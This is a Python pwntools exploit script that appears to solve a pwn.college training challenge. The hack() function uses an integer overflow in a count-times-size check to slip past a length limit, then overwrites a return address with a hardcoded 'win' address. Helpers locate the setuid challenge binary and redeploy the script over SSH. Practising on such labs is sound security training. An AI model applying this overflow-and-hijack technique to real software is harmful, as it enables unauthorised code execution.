import os
import sys
import pwn

pwn.context.arch = "amd64"
pwn.context.os = "linux"


def hack(io: pwn.process):
    import ctypes

    win_addr = 0x4022E9
    buf_diff = 0xB8 - 0x30

    nums = 0x10
    size = 0x20000000
    assert ctypes.c_int32(size * nums).value < 0x6C
    payload = b"".join(
        [
            pwn.cyclic(buf_diff),  # type: ignore
            pwn.p64(win_addr),
        ]
    )
    io.sendline(str(nums).encode())
    io.sendline(str(size).encode())
    io.sendline(payload)


def on_dojo():

    def find_challenge(search_path="/challenge"):
        from pathlib import Path
        import stat

        xs = [
            str(f.absolute())
            for f in Path(search_path).iterdir()
            if f.is_file()
            and os.access(f, os.X_OK)
            and (f.stat().st_mode & stat.S_ISUID)
        ]
        if not xs:
            raise FileNotFoundError(f"No executable found in {search_path}")
        if len(xs) > 1:
            raise FileNotFoundError(f"Multiple executables found in {search_path}")
        return xs[0]

    with pwn.process(find_challenge()) as io:
        tee(io)
        hack(io)
        io.recvrepeat()


def on_devbox():
    local_script = os.path.abspath(__file__)
    remote_script = "/tmp/pwnsolver.py"
    argv = ["/run/dojo/bin/python3", remote_script]

    def watch_mtime(path):
        last = os.stat(path=path).st_mtime_ns
        while True:
            current = os.stat(path).st_mtime_ns
            yield current == last
            last = current

    not_modified_watcher = watch_mtime(local_script)
    with pwn.ssh(user="hacker", host="dojo.pwn.college", raw=True) as ssh:
        while True:
            ssh.upload_file(local_script, remote_script)
            with tee(ssh.process(argv, executable=argv[0], aslr=True)) as io:  # type: ignore
                io: pwn.tubes.ssh.ssh_process
                try:
                    while next(not_modified_watcher):
                        io.recv(timeout=1)  # type: ignore
                    else:  # file changed during recv
                        pwn.info("Local change detected, kill and redeploying...")
                        ssh.system(f"kill -2 {io.pid}").wait()
                        continue
                except EOFError:
                    pass  # continue to monitor for file change
                except KeyboardInterrupt:
                    # io.kill() won't kill the process, we have to do it manually
                    ssh.system(f"kill -2 {io.pid}").wait()
                    return
            try:
                while next(not_modified_watcher):
                    pwn.sleep(1)  # block until file change
                pwn.info("Local change detected, redeploying...")
            except KeyboardInterrupt:
                return


def tee[T: pwn.tube](process: T) -> T:
    orig_send_raw = process.send_raw
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def send_raw(data, *args, **kwargs):
        output.write(data)
        output.flush()
        return orig_send_raw(data, *args, **kwargs)

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.send_raw = send_raw
    process.recv_raw = recv_raw
    return process


if __name__ == "__main__":
    if os.environ.get("DOJO_AUTH_TOKEN"):
        on_dojo()
    else:
        on_devbox()
